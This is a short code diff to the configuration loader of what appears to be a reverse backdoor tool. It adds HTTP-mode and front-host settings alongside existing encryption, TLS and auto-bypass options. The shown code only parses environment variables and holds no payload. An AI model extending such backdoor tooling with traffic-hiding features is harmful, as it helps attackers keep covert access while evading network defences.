@@ -38,6 +38,8 @@ def load_config():
     encryption = env.get('REVERSE_BACKDOOR_ENCRYPTION', '').lower() == 'true'
     tls = env.get('REVERSE_BACKDOOR_TLS', '').lower() == 'true'
     auto_bypass = env.get('REVERSE_BACKDOOR_AUTO_BYPASS', 'true').lower() == 'true'
+    http_mode = env.get('REVERSE_BACKDOOR_HTTP', '').lower() == 'true'
+    front_host = env.get('REVERSE_BACKDOOR_FRONT_HOST') or None
 
     return {
         'server_host': server_host,
@@ -46,4 +48,6 @@ def load_config():
         'encryption': encryption,
         'tls': tls,
         'auto_bypass': auto_bypass,
+        'http_mode': http_mode,
+        'front_host': front_host,
     }
